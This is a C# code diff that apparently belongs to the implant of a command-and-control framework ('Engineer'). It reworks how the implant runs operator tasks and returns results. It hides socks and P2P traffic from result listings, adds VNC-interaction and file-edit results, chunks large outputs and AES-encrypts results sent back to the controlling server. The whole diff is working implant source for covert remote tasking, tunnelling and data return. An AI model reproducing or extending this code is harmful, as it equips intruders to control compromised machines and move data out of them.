@@ -5,10 +5,10 @@ using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using Engineer.Commands;
 using System.Collections.Concurrent;
 using System.Threading;
 using DynamicEngLoading;
+using System.Reflection;
 
 namespace Engineer.Functions
 {
@@ -18,7 +18,7 @@ namespace Engineer.Functions
         public static ConcurrentDictionary<string, EngineerTask> engTaskDic = new(); // key is the task id and value is the whole task
         public static ConcurrentDictionary<string,CancellationTokenSource> cancellationTokenSourceDic = new();
 
-        public static void DealWithTasks(IEnumerable<EngineerTask> tasks)
+        public static async Task DealWithTasks(IEnumerable<EngineerTask> tasks)
         {
             try
             {
@@ -67,7 +67,7 @@ namespace Engineer.Functions
                     IsHidden = false,
                     Status = EngTaskStatus.Running,
                     ResponseType = TaskResponseType.None,
-                    EngineerId = Program._metadata.Id
+                    ImplantId = Program._metadata.Id
                 };
 
                 var command = Program._commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.CurrentCultureIgnoreCase)); //this should then take input and match too cmd list
@@ -83,6 +83,7 @@ namespace Engineer.Functions
                 }
                 else
                 {
+                    taskResult.IsHidden = ((EngineerCommand)command).IsHidden;
                     AddTaskResult(taskResult);
                     var result = command.Execute(task);
                 }
@@ -124,6 +125,14 @@ namespace Engineer.Functions
                     {
                         engTaskResultDic[task.Id].Result = (output as List<TokenStoreItem>).JsonSerialize();
                     }
+                    else if (TaskResponseType.EditFile == taskResponseType)
+                    {
+                        engTaskResultDic[task.Id].Result = (output as EditFile).JsonSerialize();
+                    }
+                    else if(TaskResponseType.VncInteractionEvent == taskResponseType)
+                    {
+                        engTaskResultDic[task.Id].Result = (output as VncInteractionResponse).JsonSerialize();
+                    }
                     else
                     {
                         engTaskResultDic[task.Id].Result = (output as byte[]);
@@ -141,53 +150,33 @@ namespace Engineer.Functions
                             foreach (var value in fileParts)
                             {
                                 engTaskResultDic[task.Id].Result = value.JsonSerialize();
-                                SendTaskResult(engTaskResultDic[task.Id], true);
+                                SendTaskResult(engTaskResultDic[task.Id], true).Wait();
                             }
                         }
                         else
                         {
-                            SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
+                            SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked).Wait();
                         }
-                    }
-                    //if Command name is ConnectSocks, SendSocks, ReceiveSocks send a true for ishidden
-                    else if (task.Command.Equals("socksConnect", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksSend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("socksReceive", StringComparison.CurrentCultureIgnoreCase))
-                    {
-                        engTaskResultDic[task.Id].IsHidden = true;
-                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                     }
                     else if (task.Command.Equals("P2PFirstTimeCheckIn", StringComparison.CurrentCultureIgnoreCase))
                     {
                         engTaskResultDic[task.Id].IsHidden = true;
                         SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                     }
-                    else if (task.Command.Equals("CheckIn", StringComparison.CurrentCultureIgnoreCase))
+                    else if(task.Command.Equals("socksSend",StringComparison.CurrentCultureIgnoreCase))
                     {
-                        engTaskResultDic[task.Id].IsHidden = true;
-                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
-                    }
-                    else if (task.Command.Equals("rportsend", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportRecieve", StringComparison.CurrentCultureIgnoreCase) || task.Command.Equals("rportforward", StringComparison.CurrentCultureIgnoreCase))
-                    {
-                        engTaskResultDic[task.Id].IsHidden = true;
-                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
-                    }
-                    else if (task.Command.Equals("canceltask", StringComparison.CurrentCultureIgnoreCase))
-                    {
-                        engTaskResultDic[task.Id].IsHidden = false;
-                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
-                    }
-                    else if (task.Command.Equals("UpdateTaskKey", StringComparison.CurrentCultureIgnoreCase))
-                    {
-                        engTaskResultDic[task.Id].IsHidden = true;
-                        SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
+                        engTaskResultDic.TryRemove(task.Id, out _);
+                        engTaskDic.TryRemove(task.Id, out _);
+                        //do nothing I just want to skip posting nothing to the server since this command is just for the engineer to push traffic to the sock client on this end
                     }
                     else
                     {
                         SendTaskResult(engTaskResultDic[task.Id], Program.IsDataChunked);
                     }
-                    if (engTaskResultDic[task.Id].Status != EngTaskStatus.Running)
+                    if (engTaskResultDic.ContainsKey(task.Id) && engTaskResultDic[task.Id].Status != EngTaskStatus.Running)
                     {
                         //if task is not running then remove it from the dictionary to save memory
-                        Thread.Sleep(100);
+                        //Thread.Sleep(100);
                         engTaskResultDic.TryRemove(task.Id, out _);
                         engTaskDic.TryRemove(task.Id, out _);
                     }
@@ -201,10 +190,13 @@ namespace Engineer.Functions
             }
         }
         
-        public static void SendTaskResult(EngineerTaskResult taskResult, bool isDataChunked)
+        public static async Task SendTaskResult(EngineerTaskResult taskResult, bool isDataChunked)
         {
             try
             {
+                //DEBUG
+                ///isDataChunked = false;
+                //DEBUG
                 var NewtaskResult = new EngineerTaskResult
                 {
                     Id = taskResult.Id,
@@ -212,13 +204,40 @@ namespace Engineer.Functions
                     Result = taskResult.Result,
                     IsHidden = taskResult.IsHidden,
                     Status = taskResult.Status,
-                    EngineerId = taskResult.EngineerId,
+                    ImplantId = taskResult.ImplantId,
                     ResponseType = taskResult.ResponseType,
                 };
                 if (Program.ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase))
                 {
                     //Console.WriteLine("is http calling send data");
-                    Program._commModule.SentData(NewtaskResult, isDataChunked);
+                    if (isDataChunked && NewtaskResult.Result.Length >= Program.ChunkSize)
+                    {
+                        List<DataChunk> chunkedData = new();
+                        var chunkDataModule = Program.typesWithModuleAttribute.FirstOrDefault(attr => attr.Name.Equals("DataChunk", StringComparison.OrdinalIgnoreCase));
+                        if (chunkDataModule != null)
+                        {
+                            // Get the method
+                            var method = chunkDataModule.GetMethod("ChunkData", BindingFlags.Public | BindingFlags.Static);
+                            if (method != null)
+                            {
+                                // Call the method , first argument is null because it's a static method
+                                chunkedData = (List<DataChunk>)method.Invoke(null, new object[] { NewtaskResult.Result, Program.ChunkSize, NewtaskResult.ResponseType });
+                            }
+                        }
+                        foreach (var chunk in chunkedData)
+                        {
+                            NewtaskResult.Result = chunk.JsonSerialize();
+                            NewtaskResult.ResponseType = TaskResponseType.DataChunk;
+                            Console.WriteLine($"{DateTime.UtcNow} calling SentData With ChunkedData for command {NewtaskResult.Command} data size {chunk.Length}");
+                            Program._commModule.SentData(NewtaskResult, isDataChunked);
+                            //perform a sleep cycle to allow the server to process the data
+                            await Task.Delay(EngCommBase.Sleep);
+                        }
+                    }
+                    else
+                    {
+                        Program._commModule.SentData(NewtaskResult, isDataChunked);
+                    }
                 }
 
                 else if (Program.ManagerType.Equals("tcp", StringComparison.CurrentCultureIgnoreCase))
@@ -226,7 +245,7 @@ namespace Engineer.Functions
                     //Console.WriteLine("is tcp seralizing task result");
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                     var SeraliedTaskResult = tempResult.JsonSerialize();
-                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
+                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult,"", Program.UniqueTaskKey);
                     //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                     Task.Run(async () => await Program._commModule.P2PSent(encryptedTaskResult));
                 }
@@ -235,15 +254,9 @@ namespace Engineer.Functions
                 {
                     IEnumerable<EngineerTaskResult> tempResult = new List<EngineerTaskResult> { NewtaskResult };
                     var SeraliedTaskResult = tempResult.JsonSerialize();
-                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, Program.UniqueTaskKey);
+                    var encryptedTaskResult = Encryption.AES_Encrypt(SeraliedTaskResult, "", Program.UniqueTaskKey);
                     //Console.WriteLine($"{DateTime.UtcNow} calling p2p Sent");
                     Task.Run(async () => await Program._commModule.P2PSent(encryptedTaskResult));
-                }
-
-                if (isDataChunked)
-                {
-                    //if we are sending data back in chunks we need to wait until the current one is sent before sending the next one
-                    Thread.Sleep(EngCommBase.Sleep);
                 }
 
             }
@@ -253,5 +266,6 @@ namespace Engineer.Functions
                 Console.WriteLine(e.StackTrace);
             }
         }
+        
     }
 }
